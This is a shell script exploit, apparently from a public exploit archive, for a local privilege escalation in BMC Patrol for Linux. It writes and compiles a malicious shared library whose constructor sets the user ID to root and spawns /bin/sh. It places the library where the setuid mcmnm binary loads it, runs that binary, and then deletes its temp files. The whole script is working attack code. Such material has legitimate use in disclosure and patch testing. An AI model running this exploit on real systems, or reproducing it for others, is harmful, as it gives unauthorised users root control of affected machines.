#!/bin/sh

# Exploit Title: BMC Patrol for Linux: privilege escalation via mcmnm setuid binary 
# Date: 4/21/2017
# Exploit Author: Clement LABRO
# Vendor Homepage: http://www.bmc.com/
# Version: < ???
# Tested on: RHEL x64 and Debian x64

BIN='/opt/BMCS/mq/bin/mcmnm'
LIB='libmcmclnx.so'
TMP='/tmp/'

if [ ! -f $BIN ];
then
  echo "[-] '$BIN' doesn't exist! Exiting..." && exit 
fi

if [ -f $LIB ];
then
  echo "[-] '$LIB' already exists in the current folder! Exiting..." && exit
fi
 
echo "[*] Current user: '$(whoami)'"

payload_name=$(head /dev/urandom | md5sum | cut -c1-12)
echo "[*] Writing '$TMP$payload_name.c'..."
cat > "$TMP$payload_name.c" <<- EOM
#include<stdio.h>
#include<stdlib.h>

static void so_hijacking() __attribute__((constructor));

void so_hijacking() {
  setreuid(0, 0);
  system( "/bin/sh" );
  exit(0);
}

void GetSysInfo() { }
EOM

echo "[*] Compiling $TMP$payload_name.so..."
gcc -shared -m32 -o "$TMP$payload_name.so" -fPIC "$TMP$payload_name.c" 2>/dev/null

if [ $? -eq 0 ];
then 
  echo "[+] '$TMP$payload_name.so' has been successfully created."
  echo "[*] Copying '$TMP$payload_name.so' to './$LIB'"
  cp "$TMP$payload_name.so" $LIB
  echo "[*] Executing vulnerable binary..."
  echo "[+] Should be 'root' now."
  $BIN
else
  echo "[-] Compilation failed! "
fi

echo "[*] Deleting temp files..."
if [ -f "$TMP$payload_name.so" ]; then rm "$TMP$payload_name.so"; fi
if [ -f "$TMP$payload_name.c" ]; then rm "$TMP$payload_name.c"; fi
if [ -f "$LIB" ]; then rm "$LIB"; fi
